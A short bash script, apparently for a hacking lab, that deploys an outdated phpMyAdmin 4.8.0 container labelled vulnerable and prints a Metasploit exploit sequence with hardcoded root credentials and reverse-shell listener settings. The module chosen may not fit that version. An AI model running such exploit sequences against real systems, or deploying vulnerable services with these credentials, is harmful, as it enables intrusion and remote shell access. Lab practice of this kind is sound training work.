#!/bin/bash
set -e

echo "[*] Nettoyage ancien container..."
docker stop phpmyadmin-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln 2>/dev/null || true

echo "[*] Pull phpMyAdmin 4.8.0..."
docker pull phpmyadmin/phpmyadmin:4.8.0

echo "[*] Lancement phpMyAdmin 4.8.0..."
docker run -d \
    --name phpmyadmin-vuln \
    --restart unless-stopped \
    --add-host=host.docker.internal:host-gateway \
    -e PMA_HOST=host.docker.internal \
    -e PMA_PORT=3306 \
    -p 8080:80 \
    phpmyadmin/phpmyadmin:4.8.0

echo "[*] Attente 10 secondes..."
sleep 10

echo ""
echo "========================================"
docker ps | grep phpmyadmin
echo "========================================"
curl -I http://localhost:8080/ 2>/dev/null | head -5
echo "========================================"
echo ""
echo "[+] PRÃŠT ! Exploitation depuis Kali :"
echo ""
echo "msfconsole -q"
echo "use exploit/multi/http/phpmyadmin_preg_replace"
echo "set RHOSTS 192.168.1.250"
echo "set RPORT 8080"
echo "set USERNAME root"
echo "set PASSWORD rootpass"
echo "set LHOST 192.168.100.10"
echo "set LPORT 4444"
echo "exploit"
echo ""
